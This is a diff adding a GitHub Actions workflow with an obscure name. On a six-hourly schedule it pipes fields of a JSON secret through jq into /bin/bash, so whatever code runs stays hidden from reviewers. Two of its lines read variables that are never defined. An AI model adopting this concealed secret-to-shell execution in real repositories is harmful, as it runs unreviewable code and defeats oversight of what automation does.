@@ -1,0 +1,19 @@
+name: qingwenyizhouyoujitianque
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qingwenyizhouyoujitianque
+        env:
+          gcby2815: ${{ secrets.gcby2815 }}
+        run: |
+          echo $gcby2815 | jq -r .qvjs61 | /bin/bash
+          echo $kt6 | jq -r .xrf314 | /bin/bash
+          echo $emtfk7 | jq -r .mt2268 | /bin/bash
+
